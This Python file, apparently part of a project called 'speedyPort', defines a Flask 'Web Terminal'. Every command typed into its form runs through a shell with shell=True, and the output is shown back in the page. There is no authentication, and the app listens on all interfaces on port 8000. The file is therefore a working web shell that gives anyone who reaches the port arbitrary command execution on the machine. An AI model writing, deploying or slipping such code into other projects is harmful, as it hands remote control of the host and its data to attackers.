# speedyPort/app.py

from flask import Flask, request, render_template_string
import subprocess

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Web Terminal</title>
    <style>
        body { font-family: Arial, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
        textarea { width: 80%; height: 200px; background: #1e1e1e; color: #0f0; font-family: monospace; padding: 10px; }
        input, button { background: #333; color: #fff; border: none; padding: 10px; margin: 5px; }
    </style>
</head>
<body>
    <h2>Web Terminal - Port 8000</h2>
    <form method="post">
        <input type="text" name="command" placeholder="Enter command..." required>
        <button type="submit">Execute</button>
    </form>
    <textarea readonly>{{ output }}</textarea>
</body>
</html>
"""


@app.route("/", methods=["GET", "POST"])
def index():
    output = ""
    if request.method == "POST":
        cmd = request.form.get("command")
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
        except Exception as e:
            output = str(e)
    return render_template_string(HTML_PAGE, output=output)


def run_app():
    app.run(host="0.0.0.0", port=8000, debug=False)
